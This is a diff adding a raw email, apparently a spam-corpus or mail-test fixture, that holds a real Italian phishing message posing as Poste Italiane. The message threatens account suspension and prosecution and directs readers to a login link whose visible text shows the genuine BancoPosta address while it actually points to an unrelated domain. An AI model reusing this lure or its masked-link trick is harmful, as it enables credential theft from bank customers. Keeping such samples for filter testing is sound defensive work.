@@ -1,0 +1,95 @@
+From nobody Sun Jan 25 13:50:03 2015
+Return-Path: <info@poste.it>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 9C650468DB
+ for <user@login.example.com>; Wed, 23 May 2007 23:53:31 -0400 (EDT)
+Received: from lujan.uninet.edu (bio.hgy.es [193.146.180.21])
+ by mail.example.org (Postfix) with ESMTP id 1019E131F96B
+ for <user@example.com>; Wed, 23 May 2007 23:53:30 -0400 (EDT)
+Received: by lujan.uninet.edu (Postfix)
+ id 9DEEB1C397; Thu, 24 May 2007 05:53:25 +0200 (CEST)
+Delivered-To: umeet@uninet.edu
+Received: from mar.uninet.edu (mar.uninet.edu [193.146.180.108])
+ by lujan.uninet.edu (Postfix) with ESMTP id 5C9D01C2EF
+ for <umeet@uninet.edu>; Thu, 24 May 2007 05:53:25 +0200 (CEST)
+Received: from localhost (localhost [127.0.0.1])
+ by mar.uninet.edu (Postfix) with ESMTP id 4522670A
+ for <umeet@uninet.edu>; Thu, 24 May 2007 05:53:25 +0200 (CEST)
+X-Quarantine-ID: <TOXQLfZ21iMj>
+X-Virus-Scanned: Debian amavisd-new at uninet.edu
+X-Spam-Flag: YES
+X-Spam-Score: 19.833
+X-Spam-Level: *******************
+X-Spam-Status: Yes, score=19.833 tagged_above=0 required=5 tests=[AWL=5.008,
+ BAYES_99=3.5, FORGED_MUA_OUTLOOK=4.056, FORGED_OUTLOOK_HTML=2.713,
+ FORGED_RCVD_HELO=0.135, HTML_30_40=0.374, HTML_IMAGE_ONLY_16=0.497,
+ HTML_MESSAGE=0.001, HTML_SHORT_LINK_IMG_3=0.881, MIME_HTML_ONLY=0.001,
+ MSGID_FROM_MTA_ID=1.393, UNDISC_RECIPS=0.841, X_PRIORITY_HIGH=0.433]
+Received: from lujan.uninet.edu ([193.146.180.21])
+ by localhost (mar.uninet.edu [193.146.180.108]) (amavisd-new, port 10024)
+ with ESMTP id TOXQLfZ21iMj for <umeet@uninet.edu>;
+ Thu, 24 May 2007 05:53:17 +0200 (CEST)
+Received: from mail.lgtechnet.com (unknown [67.59.176.205])
+ by lujan.uninet.edu (Postfix) with ESMTP id 1B6371C2EF
+ for <umeet@uninet.edu>; Thu, 24 May 2007 05:53:13 +0200 (CEST)
+Received: from rrcs-24-73-79-14.se.biz.rr.com [24.73.79.14] by
+ mail.lgtechnet.com with SMTP; Wed, 23 May 2007 23:51:33 -0400
+Reply-To: <no.reply@poste.it>
+From: "Poste" <info@poste.it>
+Subject: Comunicazione nr. 66472 del 23 Maggio 2007 - Leggere con attenzione!
+Date: Wed, 23 May 2007 23:49:21 -0400
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20070524035313.1B6371C2EF@lujan.uninet.edu>
+To: undisclosed-recipients: ;
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 1310
+
+<html>
+
+<head>
+<meta http-equiv=Content-Language content=en-us>
+</head>
+
+<body bgcolor=white lang=EN-US link=blue vlink=blue style='tab-interval:.5in'>
+
+<p><span style='font-family:Arial'><a
+href="http://priebernig.at/.privati2/bpol/"><span style='text-decoration:
+none;text-underline:none'><img border=0 width=254 height=42 id="_x0000_i1025"
+src="http://www.poste.it/img/tb/logo_posteitaliane.gif"></span></a><o:p></o:p></span></p>
+<br>
+
+
+Gentile Cliente,<br>
+<br>
+nell'ambito di un progetto di verifica dei data anagrafici forniti durante la sottoscrizione dei<br>
+servizi di Posteitaliane e stata riscontrata una incongruenza relativa ai dati anagrafici in oggetto <br>
+da Lei forniti all momento della sottoscrizione contrattuale.<br>
+<br>
+<br>
+L'inserimento dei dati alterati puo costituire motivo di interruzione del servizio secondo<br>
+gli art. 135 e 137/c da Lei accettati al momento della sottoscrizione, oltre a costituire reato penalmente<br>
+perseguibile secondo il C.P.P ar.415 del 2001 relativo alla legge contro il riciclaggio e la transparenza dei <br>
+dati forniti in auto certificazione.<br>
+<br>
+Per ovviare al problema e necessaria la verifica e l'aggiornamento dei dati relativi <br>
+all'anaagrafica dell'Intestatario dei servizi Postali.<br>
+Effetuare l'aggiornamento dei dati cliccando sul seguente collegamento sicuro: <br>
+<br>
+<a href="http://cateringbyrosemary.com/bancoposte.online.it/login.html">https://bancopostaonline.poste.it/bpol/cartepre/formslogin.asp</a><br>
+<br>
+Cordiali Saluti.<br>
+<br>
+</body>
+
+</html>
